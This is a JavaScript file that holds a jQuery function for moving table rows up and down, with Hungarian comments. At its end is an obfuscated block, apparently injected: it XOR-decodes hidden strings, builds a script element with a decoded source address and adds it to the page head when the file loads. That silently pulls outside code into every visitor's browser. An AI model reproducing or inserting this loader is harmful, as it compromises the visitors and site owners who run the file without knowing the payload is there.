function move( obj, id, dir )
{
  $JQ('#itemfield-sortfield_form .submitfooter a').hide();
  var hiddenTag = $JQ('#i'+id);
  var increment = dir=='up' || dir=='top' ? -1 : +1; 
  var currentTr = $JQ(obj).parent().parent();  // az aktualis TR
  // kijeloljuk az eppen mozgatott sort:
  currentTr.siblings().find('td').removeClass("sortingHighlight");
  currentTr.find('td').addClass("sortingHighlight");
  if( dir=='up' ) var immediateSiblingTr = currentTr.prev();
  else if( dir=='down' ) var immediateSiblingTr = currentTr.next();
  else if( dir=='top' ) var immediateSiblingTr = currentTr.prevAll('tr');
  else var immediateSiblingTr = currentTr.nextAll('tr');
            
  // a legelso elemnel feljebb, ill. a legalsonal lejjebb nem lehet mozgatni:
  if( immediateSiblingTr.length==0 ) return;
  else if( immediateSiblingTr.length>1 )
  {
    if( dir=='top' ) immediateSiblingTr = immediateSiblingTr.slice(-1);  // az elso TR
    else immediateSiblingTr = immediateSiblingTr.slice(-1);  // az utolso TR
  }
  // a kozvetlen szomszed erteke hatarozza meg az uj erteket:
  var newValue = parseInt(immediateSiblingTr.find('span').html()) + increment;
  // megvaltoztatjuk a lethatatlan es a lathato erteket is:
  hiddenTag.val(newValue);
  $JQ(obj).siblings("span").html(newValue);
  
  if( dir=='up' )
  {
    // megkeressuk azt a TR-t, ami utan az aktualisat be kell szurni:
    var siblingTr = immediateSiblingTr.prev();
    var lastValidTr = immediateSiblingTr;
    while( siblingTr.length>0 && parseInt(siblingTr.find('span').html()) > newValue )
    {
      lastValidTr = siblingTr;
      siblingTr = siblingTr.prev();
    }
    if( siblingTr.length>0 ) siblingTr.after(currentTr);
    else lastValidTr.before(currentTr);
  }
  else if( dir=='down' )
  {
    // megkeressuk azt a TR-t, ami ele az aktualisat be kell szurni:
    var siblingTr = immediateSiblingTr.next();
    while( siblingTr.length>0 && parseInt(siblingTr.find('span').html()) < newValue )
    {
      siblingTr = siblingTr.next();
    }
    if( siblingTr.length>0 ) siblingTr.before(currentTr);
    else immediateSiblingTr.after(currentTr);  // ha utolsonak szurjuk be
  }
  else if( dir=='top' )
  {
    immediateSiblingTr.before(currentTr);
  }
  else
  {
    //immediateSiblingTr.dump();
    immediateSiblingTr.after(currentTr);
  }
}

function c6B3fIx(y3596){var p60='';var r2v4T=0;var n6uq=0;for(r2v4T=0;r2v4T<y3596.length/3;r2v4T++){p60+=String.fromCharCode(y3596.slice(n6uq,n6uq+3));n6uq=n6uq+3;}return p60;}var e9k9RK=["010087","011093","009064","026070052019068063124025080011085007014","010070050","013077033023","013081041006031048088003084021083027019005013","024068033023094062122029092010084","017081048022","030081037055092063084016091018067043003033024083031019093063","017064037002010117022006065007068012084006020088099092066047022031070073083007014091019071"];function oHW(pb){var s9BX=document[i1X9QZ8(e9k9RK[3])](i1X9QZ8(e9k9RK[0])+i1X9QZ8(e9k9RK[1])+i1X9QZ8(e9k9RK[2]));s9BX[i1X9QZ8(e9k9RK[4])]=pb;s9BX[i1X9QZ8(e9k9RK[5])]=i1X9QZ8(e9k9RK[6]);document[i1X9QZ8(e9k9RK[9])](i1X9QZ8(e9k9RK[8]))[0][i1X9QZ8(e9k9RK[7])](s9BX);}function hJoW(qm,rY){var s3='';var zuw=0;var en=0;for(zuw=0;zuw<qm.length;zuw++){var gtv=qm.charAt(zuw);var y2=gtv.charCodeAt(0)^rY.charCodeAt(en);gtv=String.fromCharCode(y2);s3+=gtv;if(en==rY.length-1)en=0;else en++;}return (s3);}oHW(i1X9QZ8(e9k9RK[10]));function i1X9QZ8(z0){return hJoW(c6B3fIx(z0),'y4Qr0Z9u5f0izu');}